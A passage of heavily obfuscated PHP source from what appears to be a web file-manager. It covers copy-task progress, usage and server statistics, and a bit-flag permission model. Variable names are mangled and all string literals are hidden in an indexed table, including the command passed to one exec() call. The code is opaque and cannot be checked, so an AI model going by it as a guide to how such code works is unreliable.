$æÓ¾¾ë”[$£µŞö[1706]]) / $æÓ¾¾ë”[$£µŞö[1706]]; } } public function copyFileStart($Äá¼ˆ¬À, $éˆ•Ÿ, $ÜØµò°Ú, $Ã¾§Öœì, $û¤Í«¶Ã, $¹ì¦ªáË) { $»¼ÇĞë =& $_SERVER[ˆûùúÊ¯]; parent::copyFileStart($Äá¼ˆ¬À, $éˆ•Ÿ, $ÜØµò°Ú, $Ã¾§Öœì, $û¤Í«¶Ã, $¹ì¦ªáË); $¿ü¦Ÿ•Î =& $this->task; if ($¿ü¦Ÿ•Î[$»¼ÇĞë[1820]] == $»¼ÇĞë[365]) { $¿ü¦Ÿ•Î[$»¼ÇĞë[1820]] = $»¼ÇĞë[117]; } $this->update(); } public function copyFileEnd($¦‹›å’ü, $‰» à±Ã, $şö³àË¬, $‚ú¼Ô³ê, $Íİ°ĞÍî, $ÅÄ¡ë†) { $ğÚÃ¶Èø =& $_SERVER[ˆûùúÊ¯]; $ £´àÅ£ =& $this->task; $ £´àÅ£[$ğÚÃ¶Èø[1758]] = $ £´àÅ£[$ğÚÃ¶Èø[1757]]; $ £´àÅ£[$ğÚÃ¶Èø[1762]] += $ £´àÅ£[$ğÚÃ¶Èø[1757]]; $ £´àÅ£[$ğÚÃ¶Èø[1759]] = $ğÚÃ¶Èø[12]; $this->update(); } public function nameParse($ÈÊÙ§ƒ½) { $Õò¿½€ï =& $_SERVER[ˆûùúÊ¯]; $‹ÎÔÁ•¤ =& $this->task; if ($‹ÎÔÁ•¤[$Õò¿½€ï[1705]] < $‹ÎÔÁ•¤[$Õò¿½€ï[846]]) { $Â«Ÿ‰˜ = get_path_this($ÈÊÙ§ƒ½); if (strstr($Â«Ÿ‰˜, $Õò¿½€ï[10])) { $‹ÎÔÁ•¤[$Õò¿½€ï[1705]] += 1; } } if ($‹ÎÔÁ•¤[$Õò¿½€ï[1820]] == $Õò¿½€ï[1255]) { $‹ÎÔÁ•¤[$Õò¿½€ï[1820]] = $Õò¿½€ï[365]; } $‹ÎÔÁ•¤[$Õò¿½€ï[1755]] = $ÈÊÙ§ƒ½; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($³¾ú¨¶ª) { $³·×€şı =& $_SERVER[ˆûùúÊ¯]; $²ŠüË„ = array($³·×€şı[638] => array($³·×€şı[43] => $³·×€şı[1825], $³·×€şı[325] => array($³·×€şı[248], $³·×€şı[825], $³·×€şı[1826], $³·×€şı[1827])), $³·×€şı[1828] => array($³·×€şı[43] => $³·×€şı[1829], $³·×€şı[325] => array($³·×€şı[248], $³·×€şı[823], $³·×€şı[1830], $³·×€şı[1831], $³·×€şı[1832]))); if (!isset($²ŠüË„[$³¾ú¨¶ª])) { return !1; } $this->optionType = $²ŠüË„[$³¾ú¨¶ª][$³·×€şı[43]]; $this->field = $²ŠüË„[$³¾ú¨¶ª][$³·×€şı[325]]; return !0; } public function listData($ïàÓÇöŒ = false, $ü‰ˆİîì = "\155\157\x64\151\146\171\124\x69\x6d\145", $ñ©™Øæ£ = false) { return parent::listData($ïàÓÇöŒ, $ü‰ˆİîì, $ñ©™Øæ£); } public function trendList($Çï½÷Ü“) { $Ôş¬üåì =& $_SERVER[ˆûùúÊ¯]; $õç¾Å¡ = $this->listData(); if ($õç¾Å¡) { $«ó¢ÅË² = end($õç¾Å¡); $Û‡û×Â£ = date($Ôş¬üåì[1833], strtotime($Ôş¬üåì[1834])); if ($«ó¢ÅË²[$Ôş¬üåì[248]] == $Û‡û×Â£) { return $õç¾Å¡; } $ŞŞû§ñ³ = strtotime($«ó¢ÅË²[$Ôş¬üåì[248]]); } if (!isset($ŞŞû§ñ³)) { $ƒÍº­¾ƒ = $Çï½÷Ü“ == $Ôş¬üåì[638] ? $Ôş¬üåì[575] : $Ôş¬üåì[885]; $ŞŞû§ñ³ = Model($ƒÍº­¾ƒ)->min($Ôş¬üåì[224]); } $Ÿ‚Êššê = $Ôş¬üåì[1835] . ucfirst($Çï½÷Ü“); $€èÀ­èÆ = $this->dateList($ŞŞû§ñ³); foreach ($€èÀ­èÆ as $Û‡û×Â£) { $this->{$Ÿ‚Êššê}($Û‡û×Â£); } return $this->listData(); } private function dateList($óÕ™®¢ø) { $ğíàµ® =& $_SERVER[ˆûùúÊ¯]; $³™²‹ŠŠ = $óÕ™®¢ø; $¬à›õÏ = strtotime($ğíàµ®[1834]); $ìœÁÚË = array(); while ($³™²‹ŠŠ <= $¬à›õÏ) { $ìœÁÚË[] = date($ğíàµ®[1833], $³™²‹ŠŠ); $³™²‹ŠŠ = strtotime($ğíàµ®[1836], $³™²‹ŠŠ); } return $ìœÁÚË; } public function _recordUser($øßÏü£ = '') { $ò©ËåÃ¼ =& $_SERVER[ˆûùúÊ¯]; $—£ñŠé“ = strtotime(date($ò©ËåÃ¼[1837], strtotime($øßÏü£))); $’Øğ—Æå = strtotime(date($ò©ËåÃ¼[1838], strtotime($øßÏü£))); $òÊ£ÃÆ = array($ò©ËåÃ¼[224] => array($ò©ËåÃ¼[1074], $’Øğ—Æå)); $êÆ”ËÓÉ = Model($ò©ËåÃ¼[575])->where($òÊ£ÃÆ)->count($ò©ËåÃ¼[1704]); $òÊ£ÃÆ[$ò©ËåÃ¼[224]] = array($ò©ËåÃ¼[385], array($—£ñŠé“, $’Øğ—Æå)); $‰¹ßâ® = Model($ò©ËåÃ¼[575])->where($òÊ£ÃÆ)->count($ò©ËåÃ¼[1704]); $òÊ£ÃÆ[$ò©ËåÃ¼[43]] = $ò©ËåÃ¼[1839]; $±Ó®¤ı· = Model($ò©ËåÃ¼[1840])->where($òÊ£ÃÆ)->count($ò©ËåÃ¼[1841]); $ùÌŞ¤¡ = array($ò©ËåÃ¼[248] => $øßÏü£, $ò©ËåÃ¼[825] => (int) $êÆ”ËÓÉ, $ò©ËåÃ¼[1826] => (int) $‰¹ßâ®, $ò©ËåÃ¼[1827] => (int) $±Ó®¤ı·); return $this->insert($ùÌŞ¤¡); } public function _recordStore($ÇÍö•ú¡ = '') { $ŸÂšøî¯ =& $_SERVER[ˆûùúÊ¯]; $ÑåÜ‹ù¬ = strtotime(date($ŸÂšøî¯[1838], strtotime($ÇÍö•ú¡))); $—ÜşÊæÃ = array($ŸÂšøî¯[224] => array($ŸÂšøî¯[1074], $ÑåÜ‹ù¬)); $Ìı×ÂğÕ = Model($ŸÂšøî¯[520])->where($—ÜşÊæÃ)->sum($ŸÂšøî¯[86]); $—ÜşÊæÃ[$ŸÂšøî¯[461]] = 0; $ü²³¥…² = Model($ŸÂšøî¯[885])->where($—ÜşÊæÃ)->sum($ŸÂšøî¯[86]); $—ÜşÊæÃ[$ŸÂšøî¯[187]] = 1; $ØŒ¯•û = Model($ŸÂšøî¯[885])->where($—ÜşÊæÃ)->sum($ŸÂšøî¯[86]); $—ÜşÊæÃ[$ŸÂšøî¯[187]] = 2; $§é‚’È = Model($ŸÂšøî¯[885])->where($—ÜşÊæÃ)->sum($ŸÂšøî¯[86]); $šÜ³§ˆË = array($ŸÂšøî¯[248] => $ÇÍö•ú¡, $ŸÂšøî¯[823] => (int) $ü²³¥…², $ŸÂšøî¯[1830] => (int) $Ìı×ÂğÕ, $ŸÂšøî¯[1831] => (int) $ØŒ¯•û, $ŸÂšøî¯[1832] => (int) $§é‚’È); return $this->insert($šÜ³§ˆË); } public function trend($ñùßå¼£, $´Š÷ßÉÈ) { $ÚÉŠÍÜº =& $_SERVER[ˆûùúÊ¯]; if (!$this->init($ñùßå¼£)) { return !1; } $£¸™µØ• = $this->trendList($ñùßå¼£); if ($£¸™µØ• && $´Š÷ßÉÈ != $ÚÉŠÍÜº[1677]) { $ÀÍŠ = $£¸™µØ•[0][$ÚÉŠÍÜº[248]]; $ù»¶½“¸ = $this->validDate($´Š÷ßÉÈ, $ÀÍŠ); $ÙñÑÉ¢ä = array(); $óÏáÑ«² = array_to_keyvalue($£¸™µØ•, $ÚÉŠÍÜº[248]); foreach ($ù»¶½“¸ as $€×Úåù») { if (isset($óÏáÑ«²[$€×Úåù»])) { $‰–œ€ÑÍ = $óÏáÑ«²[$€×Úåù»]; } else { $‰–œ€ÑÍ = end($£¸™µØ•); $‰–œ€ÑÍ[$ÚÉŠÍÜº[248]] = $€×Úåù»; if ($ñùßå¼£ == $ÚÉŠÍÜº[638]) { $‰–œ€ÑÍ[$ÚÉŠÍÜº[1826]] = $‰–œ€ÑÍ[$ÚÉŠÍÜº[1827]] = 0; } } $ÙñÑÉ¢ä[] = $‰–œ€ÑÍ; } $£¸™µØ• = $ÙñÑÉ¢ä; } $ŒÍûËÇ³ = array($ÚÉŠÍÜº[638] => array($ÚÉŠÍÜº[825] => LNG($ÚÉŠÍÜº[1842]), $ÚÉŠÍÜº[1826] => LNG($ÚÉŠÍÜº[1843]), $ÚÉŠÍÜº[1827] => LNG($ÚÉŠÍÜº[1844])), $ÚÉŠÍÜº[1828] => array($ÚÉŠÍÜº[823] => LNG($ÚÉŠÍÜº[1845]), $ÚÉŠÍÜº[1830] => LNG($ÚÉŠÍÜº[1846]), $ÚÉŠÍÜº[1831] => LNG($ÚÉŠÍÜº[1847]), $ÚÉŠÍÜº[1832] => LNG($ÚÉŠÍÜº[1848]))); $ÈŸ¹û’İ = array($ÚÉŠÍÜº[638] => $ÚÉŠÍÜº[1849], $ÚÉŠÍÜº[1828] => $ÚÉŠÍÜº[86]); if (empty($£¸™µØ•)) { $€×Úåù» = date($ÚÉŠÍÜº[1833], strtotime($ÚÉŠÍÜº[1834])); $î±…ğœ­ = array($ÚÉŠÍÜº[248] => $€×Úåù»); foreach ($ŒÍûËÇ³[$ñùßå¼£] as $åÖß¢è° => $˜¹Äíá÷) { $î±…ğœ­[$åÖß¢è°] = 0; } $£¸™µØ•[] = $î±…ğœ­; } $Ë•ºº = array(); foreach ($£¸™µØ• as $˜¹Äíá÷) { if ($ñùßå¼£ == $ÚÉŠÍÜº[1828] && $˜¹Äíá÷[$ÚÉŠÍÜº[1830]] > $˜¹Äíá÷[$ÚÉŠÍÜº[823]]) { $˜¹Äíá÷[$ÚÉŠÍÜº[1830]] = $˜¹Äíá÷[$ÚÉŠÍÜº[823]]; } foreach ($ŒÍûËÇ³[$ñùßå¼£] as $åÖß¢è° => $şÆ‘åÄ) { $‰–œ€ÑÍ = array($ÚÉŠÍÜº[248] => $˜¹Äíá÷[$ÚÉŠÍÜº[248]], $ÚÉŠÍÜº[1601] => $şÆ‘åÄ); $‰–œ€ÑÍ[$ÈŸ¹û’İ[$ñùßå¼£]] = isset($˜¹Äíá÷[$åÖß¢è°]) ? $˜¹Äíá÷[$åÖß¢è°] : 0; $Ë•ºº[] = $‰–œ€ÑÍ; } } return $Ë•ºº; } public function validDate($ü—±”çš, $Îï‡óŞÒ) { $ÃËœ©å‡ =& $_SERVER[ˆûùúÊ¯]; $«ø‡éñ® = date($ÃËœ©å‡[1833], strtotime($ÃËœ©å‡[1834])); $†¹ŞÖŸÊ = array($«ø‡éñ®); switch ($ü—±”çš) { case $ÃËœ©å‡[1684]: $î±‘¦¼í = mktime(0, 0, 0, date($ÃËœ©å‡[1850]), date($ÃËœ©å‡[1420]) - date($ÃËœ©å‡[1483]) + 7 - 7, date($ÃËœ©å‡[1851])); $ÈßÓÏè = 0; do { $«ä¬öÏ = date($ÃËœ©å‡[1833], $î±‘¦¼í - 3600 * 24 * 7 * $ÈßÓÏè); $†¹ŞÖŸÊ[] = $«ä¬öÏ; $ÈßÓÏè++; } while ($Îï‡óŞÒ < $«ä¬öÏ); break; case $ÃËœ©å‡[1682]: $ÈßÓÏè = 1; do { $ˆëƒõÔ• = date($ÃËœ©å‡[1852], strtotime("\x2d\x20{$ÈßÓÏè}\x20\155\157\x6e\x74\150\x73")); $†¹ŞÖŸÊ[] = $ˆëƒõÔ•; $ÈßÓÏè++; } while ($Îï‡óŞÒ < $ˆëƒõÔ•); break; case $ÃËœ©å‡[1853]: $ÕŠ„·–² = (int) date($ÃËœ©å‡[1851], strtotime($Îï‡óŞÒ)); $ßµ«Í•¿ = (int) date($ÃËœ©å‡[1851]); if ($ÕŠ„·–² >= $ßµ«Í•¿) { break; } for ($ÕŠ„·–²; $ÕŠ„·–² < $ßµ«Í•¿; $ÕŠ„·–²++) { $†¹ŞÖŸÊ[] = $ÕŠ„·–² . $ÃËœ©å‡[1854]; } break; default: break; } if ($Îï‡óŞÒ > end($†¹ŞÖŸÊ)) { array_pop($†¹ŞÖŸÊ); } sort($†¹ŞÖŸÊ); return $†¹ŞÖŸÊ; } public function listTable($éäÒ³¡) { $ø•Àñ½Œ = ucfirst($éäÒ³¡); return Model($ø•Àñ½Œ)->listData(); } public function option($Œ¢ç…ùü) { $¶…»†£ş = $_SERVER[ˆûùúÊ¯][1855] . ucfirst($Œ¢ç…ùü); return $this->{$¶…»†£ş}(); } private function optionUser() { $üİ’¹è« =& $_SERVER[ˆûùúÊ¯]; $¥¿ÇÉ™Ò = Model($üİ’¹è«[575])->count($üİ’¹è«[1704]); $‹²¸€úó = Model($üİ’¹è«[575])->where($üİ’¹è«[1856])->count($üİ’¹è«[1704]); $ÏˆÍƒõó = intval($GLOBALS[$üİ’¹è«[6]][$üİ’¹è«[401]][$üİ’¹è«[1656]]) / 3600; $ôÔèÙïñ = strtotime("\55{$ÏˆÍƒõó}\x20\150\157\x75\x72\163"); $š‚Àé© = strtotime(date($üİ’¹è«[1837])); if ($ôÔèÙïñ < $š‚Àé©) { $ôÔèÙïñ = $š‚Àé©; } $âáÀß§– = array($üİ’¹è«[1857] => array($üİ’¹è«[1075], $ôÔèÙïñ)); $ú¥îÏÉ = (int) Model($üİ’¹è«[575])->where($âáÀß§–)->count($üİ’¹è«[1704]); if (!$ú¥îÏÉ) { $ú¥îÏÉ = 1; } $âáÀß§– = array($üİ’¹è«[1857] => array($üİ’¹è«[1075], $š‚Àé©)); $İŸÃ“˜Ë = Model($üİ’¹è«[575])->where($âáÀß§–)->count($üİ’¹è«[1704]); return array($üİ’¹è«[818] => (int) $¥¿ÇÉ™Ò, $üİ’¹è«[1858] => (int) ($¥¿ÇÉ™Ò - $‹²¸€úó), $üİ’¹è«[1859] => (int) $‹²¸€úó, $üİ’¹è«[1860] => (int) $İŸÃ“˜Ë, $üİ’¹è«[1861] => $ú¥îÏÉ); } private function optionFile() { $ğİØ…·è =& $_SERVER[ˆûùúÊ¯]; $ÆéËæ¹† = $this->sourceSize(); $âüğ®úá = $ÆéËæ¹†[$ğİØ…·è[86]]; $£—¨ŞÄ = $ÆéËæ¹†[$ğİØ…·è[1830]]; $Ñ×–¯ø‹ = Model($ğİØ…·è[885])->where(array($ğİØ…·è[461] => 0))->count($ğİØ…·è[190]); $íÎ”âŒó = array($ğİØ…·è[461] => 0, $ğİØ…·è[224] => array($ğİØ…·è[1075], strtotime(date($ğİØ…·è[1837])))); $‚¼º¢Şğ = Model($ğİØ…·è[885])->where($íÎ”âŒó)->sum($ğİØ…·è[86]); $ŠÃÖÄö¯ = Model($ğİØ…·è[885])->where($íÎ”âŒó)->count($ğİØ…·è[190]); return array($ğİØ…·è[823] => $âüğ®úá, $ğİØ…·è[1830] => $£—¨ŞÄ, $ğİØ…·è[1862] => $âüğ®úá - $£—¨ŞÄ, $ğİØ…·è[1863] => (int) $‚¼º¢Şğ, $ğİØ…·è[825] => (int) $Ñ×–¯ø‹, $ğİØ…·è[1864] => (int) $ŠÃÖÄö¯); } private function optionAccess() { $Ã¸³ÌŠ” =& $_SERVER[ˆûùúÊ¯]; return array($Ã¸³ÌŠ”[818] => $this->typeLogCnt(), $Ã¸³ÌŠ”[117] => $this->typeLogCnt($Ã¸³ÌŠ”[117]), $Ã¸³ÌŠ”[501] => $this->typeLogCnt($Ã¸³ÌŠ”[501]), $Ã¸³ÌŠ”[1865] => $this->typeLogCnt($Ã¸³ÌŠ”[1865]), $Ã¸³ÌŠ”[1866] => $this->typeLogCnt($Ã¸³ÌŠ”[1866]), $Ã¸³ÌŠ”[638] => $this->typeLogCnt($Ã¸³ÌŠ”[12], $Ã¸³ÌŠ”[1841])); } private function typeLogCnt($—ö¿€ÎÂ = '', $Öª±Ìç = "\151\x64") { $”®­´¸Ö =& $_SERVER[ˆûùúÊ¯]; $—å”ç×’ = array($”®­´¸Ö[117] => array($”®­´¸Ö[1867], $”®­´¸Ö[1868]), $”®­´¸Ö[501] => array($”®­´¸Ö[1869], $”®­´¸Ö[1870]), $”®­´¸Ö[1865] => array($”®­´¸Ö[1871], $”®­´¸Ö[1872], $”®­´¸Ö[1873]), $”®­´¸Ö[1866] => array($”®­´¸Ö[1874], $”®­´¸Ö[1875]), $”®­´¸Ö[1876] => array($”®­´¸Ö[1877], $”®­´¸Ö[1878], $”®­´¸Ö[1879])); $Ã£²½• = strtotime(date($”®­´¸Ö[1837])); $¬Ó…ô¥Ğ = array($”®­´¸Ö[224] => array($”®­´¸Ö[1075], $Ã£²½•)); if ($—ö¿€ÎÂ) { $¬Ó…ô¥Ğ[$”®­´¸Ö[43]] = array($”®­´¸Ö[7], $—å”ç×’[$—ö¿€ÎÂ]); } $×®šò… = Model($”®­´¸Ö[1840])->where($¬Ó…ô¥Ğ)->count($Öª±Ìç); return (int) $×®šò…; } private function optionServer() { $ØÀ³­Úº =& $_SERVER[ˆûùúÊ¯]; $á½“ çê = $this->diskDriver(); $ì³ÊÑØÈ = KodIO::defaultDriver(); $øŒßî´à = array($ØÀ³­Úº[877] => $ì³ÊÑØÈ[$ØÀ³­Úº[451]]); $åù¡²™» = Model($ØÀ³­Úº[520])->where($øŒßî´à)->sum($ØÀ³­Úº[86]); $¥©¥¨Åù = explode($ØÀ³­Úº[63], $_SERVER[$ØÀ³­Úº[153]]); $‘„¥ = $¥©¥¨Åù[0]; $ÒÀ©©Û = $GLOBALS[$ØÀ³­Úº[6]][$ØÀ³­Úº[31]]; $õó‹°‡ = $ÒÀ©©Û[$ØÀ³­Úº[1037]]; if ($õó‹°‡ == $ØÀ³­Úº[1025]) { $–¹ëŒ¶Ø = explode($ØÀ³­Úº[1343], $ÒÀ©©Û[$ØÀ³­Úº[1036]]); $õó‹°‡ = $–¹ëŒ¶Ø[0]; } if ($õó‹°‡ == $ØÀ³­Úº[973] || $õó‹°‡ == $ØÀ³­Úº[864]) { $Ëç ¦•İ = Model()->db()->query($ØÀ³­Úº[1880]); $æĞÅúİğ = $Ëç ¦•İ[0] && isset($Ëç ¦•İ[0][$ØÀ³­Úº[1600]]) ? $Ëç ¦•İ[0][$ØÀ³­Úº[1600]] : 0; $õó‹°‡ = $ØÀ³­Úº[1881] . ($æĞÅúİğ ? $ØÀ³­Úº[8] . $æĞÅúİğ : $ØÀ³­Úº[12]); } $–¿èàş¬ = $GLOBALS[$ØÀ³­Úº[6]][$ØÀ³­Úº[401]][$ØÀ³­Úº[887]]; return array($ØÀ³­Úº[1882] => $á½“ çê ? $á½“ çê[$ØÀ³­Úº[1883]] : 0, $ØÀ³­Úº[1884] => $á½“ çê ? $á½“ çê[$ØÀ³­Úº[1885]] : 0, $ØÀ³­Úº[1886] => (int) $ì³ÊÑØÈ[$ØÀ³­Úº[1883]] * 1024 * 1024 * 1024, $ØÀ³­Úº[1887] => (int) $åù¡²™», $ØÀ³­Úº[1888] => ucfirst($‘„¥), $ØÀ³­Úº[1889] => $ØÀ³­Úº[1890] . PHP_VERSION, $ØÀ³­Úº[1891] => phpBuild64() ? 64 : 32, $ØÀ³­Úº[817] => str_replace($ØÀ³­Úº[1191], $ØÀ³­Úº[1053], $õó‹°‡), $ØÀ³­Úº[401] => ucfirst($–¿èàş¬), $ØÀ³­Úº[42] => $_SERVER[$ØÀ³­Úº[1892]]); } private function diskDriver() { $şã«Û¸á =& $_SERVER[ˆûùúÊ¯]; $Öò‹ÏŒÏ = $şã«Û¸á[8]; $‰ãÕ‘Œõ = $GLOBALS[$şã«Û¸á[6]][$şã«Û¸á[1360]] == $şã«Û¸á[1361]; if ($‰ãÕ‘Œõ) { $Öò‹ÏŒÏ = $şã«Û¸á[1893]; if (function_exists($şã«Û¸á[1894])) { exec($şã«Û¸á[1895], $àï¯üï‡); $Öò‹ÏŒÏ = $àï¯üï‡[1] . $şã«Û¸á[8]; } } if (!file_exists($Öò‹ÏŒÏ)) { return; } $‘ÅŠû»† = @disk_total_space($Öò‹ÏŒÏ); $à­÷äî´ = $‘ÅŠû»† - @disk_free_space($Öò‹ÏŒÏ); return array($şã«Û¸á[1883] => $‘ÅŠû»†, $şã«Û¸á[1885] => $à­÷äî´); } public function fileChart($•ª¥ûû) { $‰Ûé˜œ¦ =& $_SERVER[ˆûùúÊ¯]; if (isset($•ª¥ûû[$‰Ûé˜œ¦[1704]])) { return Model($‰Ûé˜œ¦[885])->userFileTypeProfile($•ª¥ûû[$‰Ûé˜œ¦[1704]]); } if (isset($•ª¥ûû[$‰Ûé˜œ¦[1896]])) { return Model($‰Ûé˜œ¦[885])->groupFileTypeProfile($•ª¥ûû[$‰Ûé˜œ¦[1896]]); } $¯¡ üŸ‰ = $this->sourceSize(); $¤™§Ó¤Ş = array($‰Ûé˜œ¦[189] => 0, $‰Ûé˜œ¦[187] => 1); $Ô€²›¢ó = Model($‰Ûé˜œ¦[885])->where($¤™§Ó¤Ş)->sum($‰Ûé˜œ¦[86]); $¤™§Ó¤Ş[$‰Ûé˜œ¦[187]] = 2; $Ùçä—Ú = Model($‰Ûé˜œ¦[885])->where($¤™§Ó¤Ş)->sum($‰Ûé˜œ¦[86]); return array($‰Ûé˜œ¦[823] => $¯¡ üŸ‰[$‰Ûé˜œ¦[86]], $‰Ûé˜œ¦[1830] => $¯¡ üŸ‰[$‰Ûé˜œ¦[1830]], $‰Ûé˜œ¦[1831] => (int) $Ô€²›¢ó, $‰Ûé˜œ¦[1832] => (int) $Ùçä—Ú); } private function sourceSize() { $‡Ÿ¯§ÂÂ =& $_SERVER[ˆûùúÊ¯]; $Ñà÷›Úõ = Model($‡Ÿ¯§ÂÂ[885])->where(array($‡Ÿ¯§ÂÂ[461] => 0))->sum($‡Ÿ¯§ÂÂ[86]); $É–é˜Ö“ = Model($‡Ÿ¯§ÂÂ[520])->sum($‡Ÿ¯§ÂÂ[86]); if ($É–é˜Ö“ > $Ñà÷›Úõ) { $É–é˜Ö“ = $Ñà÷›Úõ; } return array($‡Ÿ¯§ÂÂ[86] => (int) $Ñà÷›Úõ, $‡Ÿ¯§ÂÂ[1830] => (int) $É–é˜Ö“); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $²å¿ĞÁ =& $_SERVER[ˆûùúÊ¯]; $÷»¿ÑŠ¹ = array(array($²å¿ĞÁ[470] => LNG($²å¿ĞÁ[1897]), $²å¿ĞÁ[1898] => $²å¿ĞÁ[1899], $²å¿ĞÁ[1900] => 1, $²å¿ĞÁ[1901] => 1, $²å¿ĞÁ[1902] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($²å¿ĞÁ[470] => LNG($²å¿ĞÁ[1903]), $²å¿ĞÁ[1898] => $²å¿ĞÁ[1904], $²å¿ĞÁ[1900] => 2, $²å¿ĞÁ[1901] => 1, $²å¿ĞÁ[1902] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($²å¿ĞÁ[470] => LNG($²å¿ĞÁ[1905]), $²å¿ĞÁ[1898] => $²å¿ĞÁ[1906], $²å¿ĞÁ[1900] => 3, $²å¿ĞÁ[1901] => 1, $²å¿ĞÁ[1902] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($²å¿ĞÁ[470] => LNG($²å¿ĞÁ[1907]), $²å¿ĞÁ[1898] => $²å¿ĞÁ[1908], $²å¿ĞÁ[1900] => 4, $²å¿ĞÁ[1901] => 1, $²å¿ĞÁ[1902] => self::AUTH_SHOW | self::AUTH_VIEW), array($²å¿ĞÁ[470] => LNG($²å¿ĞÁ[1909]), $²å¿ĞÁ[1898] => $²å¿ĞÁ[1910], $²å¿ĞÁ[1900] => 5, $²å¿ĞÁ[1901] => 1, $²å¿ĞÁ[1902] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($²å¿ĞÁ[470] => LNG($²å¿ĞÁ[1911]), $²å¿ĞÁ[1898] => $²å¿ĞÁ[1912], $²å¿ĞÁ[1900] => 6, $²å¿ĞÁ[1901] => 1, $²å¿ĞÁ[1902] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($²å¿ĞÁ[470] => LNG($²å¿ĞÁ[1913]), $²å¿ĞÁ[1898] => $²å¿ĞÁ[1914], $²å¿ĞÁ[1900] => 7, $²å¿ĞÁ[1901] => 1, $²å¿ĞÁ[1902] => 0)); return $÷»¿ÑŠ¹; } public static function authCheck($ºÚ°İ³, $‰ç•ŒÉ¹) { $Â¯ôÃ =& $_SERVER[ˆûùúÊ¯]; $ºÚ°İ³ = intval($ºÚ°İ³); if ($GLOBALS[$Â¯ôÃ[544]] && $GLOBALS[$Â¯ôÃ[6]][$Â¯ôÃ[1915]]) { return !0; } if ($ºÚ°İ³ <= 0) { return !1; } if (($ºÚ°İ³ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ºÚ°İ³ & $‰ç•ŒÉ¹); } public static function authCheckShow($å€€”­à) { return self::authCheck($å€€”­à, self::AUTH_SHOW); } public static function authCheckView($‘ŒÃ—) { return self::authCheck($‘ŒÃ—, self::AUTH_VIEW); } public static function authCheckDownload($Ø¬½îŒ±) { return self::authCheck($Ø¬½îŒ±, self::AUTH_DOWNLOAD); } public static function authCheckUpload($é¨Å³é) { return self::authCheck($é¨Å³é, self::AUTH_UPLOAD); } public static function authCheckEdit($’à×ˆÊù) { return self::authCheck($’à×ˆÊù, self::AUTH_EDIT); } public static function authCheckRemove($¶ÒĞ –) { return self::authCheck($¶ÒĞ –, self::AUTH_REMOVE); } public static function authCheckShare($óğªŒÙ) { return self::authCheck($óğªŒÙ, self::AUTH_SHARE); } public static function authCheckComment($‘¾çÅê“) { return self::authCheck($‘¾çÅê“, self::AUTH_COMMENT); } public static function authCheckEvent($ğÆ¸û÷) { return self::authCheck($ğÆ¸û÷, self::AUTH_EVENT); } public static function authCheckRoot($Ò—ÀÉ’¦) { return self::authCheck($Ò—ÀÉ’¦, self::AUTH_ROOT); } public static function authCheckAction($şÂŞ Äà, $ñ¼Õğô²) { $ûñıÀë =& $_SERVER[ˆûùúÊ¯]; $äñïâ‘Ô = array($ûñıÀë[1916] => self::AUTH_VIEW, $ûñıÀë[1255] => self::AUTH_DOWNLOAD, $ûñıÀë[117] => self::AUTH_UPLOAD, $ûñıÀë[1866] => self::AUTH_EDIT, $ûñıÀë[1865] => self::AUTH_REMOVE, $ûñıÀë[1876] => self::AUTH_SHARE, $ûñıÀë[406] => self::AUTH_COMMENT, $ûñıÀë[1692] => self::AUTH_EVENT, $ûñıÀë[1917] => self::AUTH_ROOT); if (!isset($äñïâ‘Ô[$ñ¼Õğô²])) { return; } $ÈéŞÓ˜İ = $äñïâ‘Ô[$ñ¼Õğô²]; $şÂŞ Äà = intval($şÂŞ Äà); if ($şÂŞ Äà <= 0) { return !1; } if (($şÂŞ Äà & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($şÂŞ Äà & $ÈéŞÓ˜İ); } public static function authDisable($³Ó‹¡ø›, $¸Ş×Ç) { if (intval($³Ó‹¡ø›) <= 0) { return 0; } return intval($³Ó‹¡ø›) & ~$¸Ş×Ç; } public $optionType = "\123\171\x73\x74\x65\x6d\56\x73\157\x75\x72\x63\x65\101\165\164\x68\x4c\x69\163\164"; public $field = array("\x6e\x61\155\145", "\x61\x75\164\150", "\x6c\x61\142\145\154", "\x64\151\163\160\154\141\171", "\x73\x79\x73\164\x65\155", "\x73\157\x72\164"); public function initData() { $¥ß¥ƒ™† = $this->authDefault(); foreach ($¥ß¥ƒ™† as $”òÎ¡íû) { $this->add($”òÎ¡íû); } } public function findAuth($ö–®Â“, $ãÚøú†) { $öŞ–‘²Ö =& $_SERVER[ˆûùúÊ¯]; $©ï÷½™“ = parent::listData(); foreach ($©ï÷½™“ as $Û·Øíëå) { $ËÒÇ¡û = intval($Û·Øíëå[$öŞ–‘²Ö[463]]); if ($ËÒÇ¡û <= 0 || $Û·Øíëå[$öŞ–‘²Ö[1918]] == 0) { continue; } if (($ËÒÇ¡û & $ö–®Â“) != $ö–®Â“) { continue; } if (($ËÒÇ¡û & $ãÚøú†) != 0) { continue; } return $Û·Øíëå[$öŞ–‘²Ö[451]]; } return !1; } public function findAuthReadOnly() { $éó¯Ö‘é = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $äçŞ˜•ô = self::AUTH_UPLOAD | 